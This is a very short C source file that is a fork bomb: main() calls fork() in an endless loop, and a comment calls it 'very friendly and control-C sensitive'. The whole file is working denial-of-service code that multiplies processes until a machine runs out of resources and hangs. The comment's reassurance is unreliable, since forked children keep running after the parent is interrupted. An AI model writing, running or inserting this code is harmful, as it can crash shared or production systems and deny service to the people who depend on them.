// a very friendly and control-C sensitive fork bomb. 
#include <stdio.h> 
main() { 
    while(1) fork(); 
} 
